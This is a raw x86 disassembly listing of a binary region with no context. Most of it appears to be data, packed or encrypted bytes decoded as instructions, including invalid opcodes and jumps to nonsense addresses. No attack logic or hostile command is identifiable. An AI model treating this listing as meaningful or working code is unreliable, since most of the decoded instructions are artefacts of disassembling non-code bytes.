  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x877be983
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [esi+0x29000006],al
  41edc3:	mul    BYTE PTR [ebp-0x32]
  41edc6:	cs rcr eax,0xbf
  41edca:	adc    al,ch
  41edcc:	xchg   esi,eax
  41edcd:	sbb    BYTE PTR [edx+0x7e],dh
  41edd0:	push   0x33
  41edd2:	mov    al,0x64
  41edd4:	add    eax,0x2c2488a4
  41edd9:	push   esi
  41edda:	js     0x41ed78
  41eddc:	pop    eax
  41eddd:	int3   
  41edde:	int    0x53
  41ede0:	add    BYTE PTR ds:0x4d1b15a6,al
  41ede6:	push   ds
  41ede7:	sahf   
  41ede8:	outs   dx,DWORD PTR ds:[esi]
  41ede9:	dec    ebx
  41edea:	pop    ds
  41edeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edec:	popf   
  41eded:	mov    dl,0x93
  41edef:	jge    0x41edea
  41edf1:	jne    0x41ee35
  41edf3:	xor    ebp,esi
  41edf5:	jne    0x41ed8a
  41edf7:	add    DWORD PTR [ebp-0x5c],edi
  41edfa:	retf   0x8429
  41edfd:	loope  0x41edc3
  41edff:	dec    ebp
  41ee00:	sahf   
  41ee01:	cmp    cl,BYTE PTR [edx]
  41ee03:	push   es
  41ee04:	sbb    dh,BYTE PTR [ecx+ebp*4-0xc]
  41ee08:	neg    BYTE PTR ds:0xc4cced34
  41ee0e:	lods   al,BYTE PTR ds:[esi]
  41ee0f:	dec    esp
  41ee10:	add    DWORD PTR [edi-0x6e1c720f],edi
  41ee16:	push   eax
  41ee17:	mov    al,0xfe
  41ee19:	sbb    eax,0xbb9ba7ae
  41ee1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee1f:	scas   eax,DWORD PTR es:[edi]
  41ee20:	pop    ds
  41ee21:	jle    0x41edf8
  41ee23:	bound  eax,QWORD PTR [ebp-0x74cc102e]
  41ee29:	mov    al,ds:0xc33ba19d
  41ee2e:	xchg   ebx,eax
  41ee2f:	dec    edx
  41ee30:	mov    ch,0xc4
  41ee32:	les    edx,FWORD PTR [edi-0x221fa27e]
  41ee38:	mov    al,0x84
  41ee3a:	or     ah,al
  41ee3c:	xor    eax,0x194bd5af
  41ee41:	fdivr  st(1),st
  41ee43:	mov    ebp,ecx
  41ee45:	fldenv [eax+edx*8]
  41ee48:	fiadd  WORD PTR ds:0x88f59b29
  41ee4e:	inc    edi
  41ee4f:	in     eax,0xc7
  41ee51:	loop   0x41ee5e
  41ee53:	inc    ebp
  41ee54:	jge    0x41edd6
  41ee56:	pop    ebp
  41ee57:	mov    cl,0x33
  41ee59:	loopne 0x41eea7
  41ee5b:	sbb    DWORD PTR [edi-0x73e1bca8],edi
  41ee61:	push   edi
  41ee62:	xor    dh,BYTE PTR [ebx+0x59df1738]
  41ee68:	(bad)  
  41ee69:	out    dx,eax
  41ee6a:	push   0xbe1e2bd5
  41ee6f:	push   cs
  41ee70:	ja     0x41ee28
  41ee72:	cmp    dl,BYTE PTR [edi+0x68]
  41ee75:	out    dx,al
  41ee76:	mov    bh,0x99
  41ee78:	(bad)  
  41ee79:	pop    eax
  41ee7a:	mov    edx,0xd993f728
  41ee7f:	xor    DWORD PTR [esi+0x3c],esi
  41ee82:	pusha  
  41ee83:	cmp    dl,BYTE PTR [edi+0x63]
  41ee86:	dec    ebx
  41ee87:	cdq    
  41ee88:	test   eax,0x28d74dc8
  41ee8d:	test   DWORD PTR [esi-0x21bcb1ed],edx
  41ee93:	mov    esi,0xe48b9604
  41ee98:	jnp    0x41eee1
  41ee9a:	aad    0xe4
  41ee9c:	push   ecx
  41ee9d:	inc    ebp
  41ee9e:	jo     0x41eeee
  41eea0:	je     0x41eec0
  41eea2:	xor    DWORD PTR [edx+0x71751938],eax
  41eea8:	mov    ecx,0xcb73b13c
  41eead:	pop    edx
  41eeae:	pop    edi
  41eeaf:	pop    ebp
  41eeb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeb1:	sbb    BYTE PTR [ebx],bh
  41eeb3:	sub    edx,esp
  41eeb5:	mov    dh,0x4a
  41eeb7:	ror    DWORD PTR [ebp+0x39],cl
  41eeba:	push   ss
  41eebb:	retf   
  41eebc:	xchg   DWORD PTR [edx],esp
  41eebe:	xor    ebx,DWORD PTR [ebp+0xb]
  41eec1:	(bad)  
  41eec2:	xlat   BYTE PTR ds:[ebx]
  41eec3:	inc    edx
  41eec4:	std    
  41eec5:	lea    esp,[ebp-0x74c2e464]
  41eecb:	lock mov edx,0x274add00
  41eed1:	mov    ebx,0xf674c500
  41eed6:	sbb    eax,DWORD PTR [ecx+0x6776609a]
  41eedc:	adc    eax,0x341f59
  41eee1:	lods   eax,DWORD PTR ds:[esi]
  41eee2:	jne    0x41ef57
  41eee4:	adc    eax,DWORD PTR [ecx+0x2acab9bb]
  41eeea:	xor    BYTE PTR [edx-0x9],bh
  41eeed:	cmp    eax,0x8c004eb3
  41eef2:	(bad)  
  41eef3:	sar    BYTE PTR ss:[ebx+0x248e9b6],0x3d
  41eefb:	mov    es,WORD PTR [ecx]
  41eefd:	fnsave [ecx+0x1c10c246]
  41ef03:	ret    0x5da0
  41ef06:	push   ebp
  41ef07:	mov    eax,ds:0x9bafc17c
  41ef0c:	pop    esp
  41ef0d:	ret    0x499c
  41ef10:	aas    
  41ef11:	xchg   ecx,eax
  41ef12:	loope  0x41eec6
  41ef14:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef17:	inc    eax
  41ef18:	mov    bl,BYTE PTR [ebx]
  41ef1a:	cmp    ebx,DWORD PTR [edx+0x6b45300e]
  41ef20:	in     eax,dx
  41ef21:	stos   BYTE PTR es:[edi],al
  41ef22:	sub    cl,dl
  41ef24:	add    BYTE PTR [eax-0x54],cl
  41ef27:	shr    DWORD PTR [ebx],0xba
  41ef2a:	jge    0x41ef3d
  41ef2c:	aaa    
  41ef2d:	fld    DWORD PTR [ebx+0x4423fd2f]
  41ef33:	mov    ds:0xce474edb,eax
  41ef38:	mov    ch,0xb6
  41ef3a:	js     0x41eedd
  41ef3c:	stos   DWORD PTR es:[edi],eax
  41ef3d:	jecxz  0x41ef9c
  41ef3f:	push   es
  41ef40:	mov    esi,0x5ef5e698
  41ef45:	out    dx,al
  41ef46:	dec    ebx
  41ef47:	sti    
  41ef48:	nop
  41ef49:	fwait
  41ef4a:	cmc    
  41ef4b:	xchg   esi,eax
  41ef4c:	(bad)  
  41ef4d:	in     eax,0xbd
  41ef4f:	push   ss
  41ef50:	popa   
  41ef51:	fiadd  WORD PTR [esi-0xc]
  41ef54:	sar    BYTE PTR [ebp-0x290cc486],cl
  41ef5a:	jmp    0x2b7f:0x2dc2da6c
  41ef61:	mov    ch,0x40
  41ef63:	cmp    BYTE PTR ds:0xf46211d,0x32
  41ef6a:	dec    esi
  41ef6b:	jne    0x41efb0
  41ef6d:	mov    eax,0xf984f5b5
  41ef72:	pop    esi
  41ef73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef74:	add    DWORD PTR ds:0xa8213285,ebp
  41ef7a:	push   esi
  41ef7b:	shl    DWORD PTR [edx],0x80
  41ef7e:	mov    bh,0x4c
  41ef80:	mov    DWORD PTR [eax+0x4f],esi
  41ef83:	jmp    0xdd44373f
  41ef88:	mov    dh,0xdc
  41ef8a:	pop    edx
  41ef8b:	popa   
  41ef8c:	in     eax,dx
  41ef8d:	inc    esp
  41ef8e:	push   esi
  41ef8f:	dec    esi
  41ef90:	add    eax,0x10f06ad4
  41ef95:	jmp    0x41ef3d
  41ef97:	sar    BYTE PTR [ebx+0x17],0x90
  41ef9b:	fcomp  st(6)
  41ef9d:	jno    0x41efa0
  41ef9f:	out    dx,al
  41efa0:	mov    bh,0x5c
  41efa2:	jb     0x41f00e
  41efa4:	push   cs
  41efa5:	adc    edx,eax
  41efa7:	pop    ebp
  41efa8:	pop    ebx
  41efa9:	clc    
  41efaa:	inc    edi
  41efab:	adc    ch,BYTE PTR [ebx+eiz*1]
  41efae:	test   eax,0xf35548f9
  41efb3:	bound  esp,QWORD PTR [edx+0x70]
  41efb6:	push   ds
  41efb7:	call   FWORD PTR [edi-0x5b]
  41efba:	mov    ah,0xe5
  41efbc:	bound  esi,QWORD PTR [eax]
  41efbe:	mov    gs,WORD PTR [edi-0x6c542765]
  41efc4:	pop    esi
  41efc5:	or     al,0xc2
  41efc7:	lods   al,BYTE PTR ds:[esi]
  41efc8:	xchg   BYTE PTR [ebx],dl
  41efca:	push   ebx
  41efcb:	scas   al,BYTE PTR es:[edi]
  41efcc:	stos   BYTE PTR es:[edi],al
  41efcd:	sbb    ah,BYTE PTR [edi+0x17]
  41efd0:	xchg   edi,eax
  41efd1:	(bad)  
  41efd2:	retf   
  41efd3:	cs into 
  41efd5:	sbb    al,BYTE PTR [esi-0x4216de43]
  41efdb:	jns    0x41efe1
  41efdd:	sub    al,0xbb
  41efdf:	mov    ebx,0x9a5a3a67
  41efe4:	sar    cl,1
  41efe6:	push   edx
  41efe7:	push   0xffffff8e
  41efe9:	jne    0x41f030
  41efeb:	out    dx,al
  41efec:	mov    dh,0x80
  41efee:	pop    es
  41efef:	shl    DWORD PTR [edx-0x79],0x88
  41eff3:	and    DWORD PTR [ebp+0x28],edx
  41eff6:	add    DWORD PTR ds:0x8173756d,esi
  41effc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41effd:	je     0x41f05b
  41efff:	xchg   ecx,eax
  41f000:	fwait
  41f001:	adc    al,0xed
  41f003:	inc    ebx
  41f004:	sub    BYTE PTR [esi],al
  41f006:	dec    edx
  41f007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f008:	call   0x5656:0x8ec7a5b5
  41f00f:	hlt    
  41f010:	or     DWORD PTR [edi+esi*4-0x3f3ac29a],edx
  41f017:	sub    esi,ecx
  41f019:	mov    ds:0x6bc25c86,al
  41f01e:	addr16 jl 0x41effb
  41f021:	mov    ?,WORD PTR [esi+0x51]
  41f024:	and    ch,BYTE PTR [esi+0x16b66da8]
  41f02a:	dec    esi
  41f02b:	iret   
  41f02c:	test   DWORD PTR [edx],edi
  41f02e:	pushf  
  41f02f:	scas   eax,DWORD PTR es:[di]
  41f031:	outs   dx,DWORD PTR ds:[esi]
  41f032:	and    edi,DWORD PTR [ebp-0x2daed401]
  41f038:	xchg   ebx,eax
  41f039:	aam    0x63
  41f03b:	jne    0x41f097
  41f03d:	adc    al,0xcc
  41f03f:	call   0xa2f0fa31
  41f044:	cmp    eax,0xb0301378
  41f049:	sar    BYTE PTR [si-0xaa6],cl
  41f04e:	push   es
  41f04f:	pop    ds
  41f050:	mov    BYTE PTR [edi+0x5f],bl
  41f053:	(bad)  
  41f054:	push   ecx
  41f055:	inc    ecx
  41f056:	leave  
  41f057:	pusha  
  41f058:	(bad)  
  41f059:	sub    edi,DWORD PTR ds:0xd8aaf679
  41f05f:	popf   
  41f060:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f062:	adc    dh,BYTE PTR [edx+0x682a8f75]
  41f068:	fnstsw WORD PTR [ecx+eax*1]
  41f06b:	int    0x46
  41f06d:	lahf   
  41f06e:	aas    
  41f06f:	mov    eax,0x7a2592ef
  41f074:	mov    ebp,0xc34f978a
  41f079:	sbb    eax,0x7ca4592b
  41f07e:	leave  
  41f07f:	xchg   ecx,eax
  41f080:	scas   al,BYTE PTR es:[edi]
  41f081:	mov    edx,0xac3efca4
  41f086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f087:	mov    ah,0xe3
  41f089:	in     eax,dx
  41f08a:	or     al,0xb8
  41f08c:	push   edi
  41f08d:	imul   edi,DWORD PTR [edx-0x506e4274],0x3dc87a24
  41f097:	hlt    
  41f098:	test   al,0xda
  41f09a:	xchg   ebp,eax
  41f09b:	jo     0x41f078
  41f09d:	ror    dl,0xcb
  41f0a0:	iret   
  41f0a1:	call   0x16ce:0x9ae8fe30
  41f0a8:	aas    
  41f0a9:	idiv   DWORD PTR [esi-0x3e]
  41f0ac:	pop    ebx
  41f0ad:	dec    eax
  41f0ae:	jb     0x41f10f
  41f0b0:	outs   dx,DWORD PTR ds:[esi]
  41f0b1:	fisttp WORD PTR [esi-0x3bca416f]
